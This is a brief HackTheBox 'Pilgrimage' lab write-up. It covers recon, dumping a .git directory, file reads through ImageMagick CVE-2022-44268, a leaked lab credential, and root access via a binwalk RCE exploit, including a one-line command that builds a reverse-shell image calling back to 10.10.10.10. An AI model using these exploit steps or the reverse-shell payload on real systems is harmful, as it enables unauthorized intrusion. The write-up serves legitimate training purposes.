# Pilgrimage

### Reconnaissance

- port 22 SSH OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
- port 80 HTTP nginx 1.18.0

gobuster found directories all return 403

/assets/
/shrunk/ -> shrunk files stored here
/tmp/
/vendor/

File upload, php backend

Got stuck, used [this walkthrough](https://medium.com/@babayaga00897/pilgrimage-htb-writeup-ae8242270434) need to use -sVC with nmap scan, missing things with -A

There is a .git directory which can de downloaded with [git-dumper](https://github.com/arthaud/git-dumper)

### Exploitation

Inside we find the image shrinker, magick, which is vulnerable to an arbitrary file read 

https://www.metabaseq.com/imagemagick-zero-days/
https://github.com/voidz0r/CVE-2022-44268

This allows us to access the /etc/passwd file and the database mentioned in the .git directory, giving us 
emily's credentials

emily:abigchonkyboi123

### Privilege Escalation

/usr/bin/malwarescan.sh running as root, we have read access. It uses binwalk to analyze files and delete any 
unwanted file types (binaries) and the version being used is vulnerable to RCE which grants us root access.

Use exploit-db [binwalk exploit](https://www.exploit-db.com/exploits/51249) to generate a malicious image

`exploit.py image.png 10.10.10.10 1337`

Then start a listener and upload the exploit image to /var/www/pilgrimage.htb/shrunk/ and wait for a 
connection, granting root access
